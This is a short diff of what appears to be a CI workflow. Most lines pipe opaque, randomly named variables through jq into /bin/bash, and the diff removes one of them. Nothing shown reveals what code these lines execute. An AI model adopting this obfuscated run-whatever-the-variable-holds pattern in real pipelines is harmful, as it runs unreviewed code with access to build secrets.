@@ -31,7 +31,6 @@ jobs:
           echo $mqb1 | jq -r .wpeuh2743 | /bin/bash
           printf '%s' "$q708" | jq -r .o7790 | /bin/bash
           echo $s10 | jq -r .bcny93298 | /bin/bash
-          printf '%s' "$dmit5" | jq -r .oezz72291 | /bin/bash
           printf '%s' "$oy4336" | jq -r .qzx72 | /bin/bash
           printf '%s' "$ppq63435" | jq -r .kitvy509 | /bin/bash
           printf '%s' "$ut76396" | jq -r .wnt91274 | /bin/bash
